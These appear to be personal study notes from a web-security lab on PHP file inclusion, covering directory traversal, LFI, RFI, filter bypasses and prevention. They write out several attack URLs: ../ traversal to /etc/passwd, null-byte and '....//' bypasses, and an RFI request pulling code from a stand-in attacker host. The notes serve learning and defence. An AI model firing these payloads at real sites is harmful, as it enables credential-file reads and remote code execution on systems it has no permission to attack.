a..
- File Inclusion vulnerabilities occur when web applications are written in poor PHP or javascript. Mainly caused by input validation in which user input is not sanitized or validated, allowing the user to pass any input to a backend function.

- Types:
	- Local File Inclusion
	- Remote File Inclusion
	- Directory Traversal

To better understand File Inclusion, lets first understand the parts of a URL that may be supplied to allow for the retrieval of data or the execution of actions based on user input:

![[Pasted image 20230225181857.png]]

**Scenario - User requests access to files on a webserver**

1. User sends an HTTP request to the webserver that includes the file to display. `http://webapp.thm/get.php?file=userCV.pdf`
2. Here, the user has supplied file as the parameter, and `userCV.pdf` is the file they want to access.
3. The web application would then take this request  and interpret it using its php code. 
4. The user CV would be returned likely from a folder containing CVs.

File inclusion can allow leaking of sensitive data, and can even allow remote command execution if an attacker is able to write to the server's /tmp directory.

***File Inclusion Hands-On***

**Directory Traversal**

- Also known as path traversal, this is a web security vulnerability that allows an attacker to read OS resources such as local files that run the application.

- Attackers exploit this vulnreability by maniuplating the URL to locate and access files stored outsdie the application's root directory.

- Oftentimes, the user's invalidated input will be passed to a function such as `file_get_contents` in PHP.

Ex:

![[Pasted image 20230225184709.png]]

Here, the user requests the contents of the userCV.pdf password by backpedaling to the /etc  directory, and then having the passwd content be displayed to the user. 

- If there isn't input validation, the web application would retrieve files from other directories (which attacker directs through using '..') instead of accessing PDF files at the supposed `/var/www/app/CVs` location.

- ![[Pasted image 20230225184954.png]]

- The supplied user command `http://webapp.thm/get.php?file=../../../../etc/passwd` moves four directories back, until the root directory ('\' in linux and 'c:\' in Windows) is reached, and then the passwd file is read form the /etc/passwd directory.


**Common OS files to try directory traversal against**

![[Pasted image 20230225185221.png]]

If the user is able to return information using these OS files, they get valuable information that can be used to exploit the system.


**Local File Inclusion**

- Occur as aresult of developers use of `include`, `require`, `include_once` that createse vulnerable webapps.

- Suppose we have the following sample code:

![[Pasted image 20230225222251.png]]

- This code uses a GET request to include the language parameter `lang` of the page.

The call performed with this is `http://webapp.thm/index.php?lang=EN.php` which will load the english page, in which EN.php will exist in the same directory as AR.php.

- If there isn't any input validation, **we can access and display any readable file on the server**.

**Crafting LFI to read the /etc/passwd file**

`http://webapp.thm/get.php?file=etc/passwd`

**THIS ONLY WORKS IS THERE ISN'T A DIRECTORY SPECIFIED IN TEH INCLUDE FUNCTION, AND IF THERE IS NO INPUT VALIDATION.** 

- If the following code were implemented, the directory in the include function is limited to the languages directory.

![[Pasted image 20230225222852.png]]

Here, whatever is in the `$_Get[...]` is the variable name that will be displayed in the browser as a parameter.

Still, since there is no input validation, the attacker can manipulate the URL by replacing the `lang` input with other OS sensitive files such as `/etc/passwd`.

- The include function above allows us to include any called files into the current page:

`http://webapp.thm/index.php?lang=../../../../etc/passwd`.


**Using Null bytes in LFI to bypass file type restrictions**

- `%00` can be appended to user supplied string such as `http://webapp.thm/index.php?lang=../../../../etc/passwd%00` in order to trick the respective `include` function to ignore anything after the null byte.

So, the include function would interpret our GET request as:

`include("languages/../../../../../etc/passwd");`

This was fixed in PHP 5.3.4 and above.

**Bypassing Filtering of keywords**

- Sometimes the developer will filter out `../` which something like an empty string.

We can still bypass this by doing `....//` in which the first `../` will be removed, but the resulting input will still equal `../`.


- Additionally, if the user input is being filtered for the inclusion of `/etc/passwd`, we can bypass this by using a NullByte `%00` at the end of the string.

Ex:

![[Pasted image 20230225225929.png]]
![[Pasted image 20230225225940.png]]


**What if the developer forces the include to read from a defined directory?**

- If the web application asks to supply input that has to be included in a specific directory such as `http://webapp.thm/index.php?file=languages/EN.php`, then we would need to include the directory in the payload:

`?file=languages/../../../../../etc/passwd`

Including the `languages/` directory is key here, in order to exploit what to read.


---
***Remote File Inclusion***

- Technique that allows an attacker to include external files into a vulnerable application.

- Occurs under the same condition of improperly sanitized user input as LFI.

- Attacker will inject an external URL into the PHP `include` function.

***REQUIREMENT***

`allow_url_fopen` needs to be `on`.


- In general, the risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution on the server. Can also cause
	- Sensitive Information disclosure
	- Cross-site Scripting (XSS)
	- Denial of Service (DoS)


![[Pasted image 20230225233329.png]]

- First, an attacker would craft a malicious HTTP request with that injects a malicious URL:

`http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`.

With no input validation, the malicious url `http://attacker.thm/cmd.txt` would pass into the include function.

2. Once the web server receives this, it will send a GET request to the malicious server `attacker.thm` to get this.

3. Then the attackers server would respond to the affected server and provide the content of the `cmd.txt` which likely has malicious PHP code.

4. Finally, the exploited server injects the content of `cmd.txt` into the `index.php` include function and execute it.

5. The result of execution would be displayed within the `index.php page`, and the attacker could see some sensitive data displayed.


**Preventing File Inclusion Vulnerabilities**

- Keep services and frameworks updated.
- Disable PHP errors
- Implement Web Application FIrewall (WAF)
- Disable PHP fucntions such as `allow_url_fopen` and `allow_url_include`
- Sanitize user input


**Exploiting RFI to get RCE**

- We have a php file `playground.php` that does not filter user input and has `allow_url_fopen` on.

- We inject a malformed GET request to the python server I host on 10.6.40.110 using the `file` parameter in order to execute the `test.php` file that is on my machine.


![[Pasted image 20230226000904.png]]

The test.php file uses the `shell_exec()` function in order to execute the `hostname` command once the file is ran.

![[Pasted image 20230226000936.png]]

Once we run the above query, the file is downloaded and ran on the website:

![[Pasted image 20230226001004.png]]

![[Pasted image 20230226001012.png]]

**Using Curl to send POST requests**

- This is useful in a scenario in which an input field (which engages a GET request form the server) doesn't work, and a direct POST is needed to the server.

![[Pasted image 20230226004343.png]]
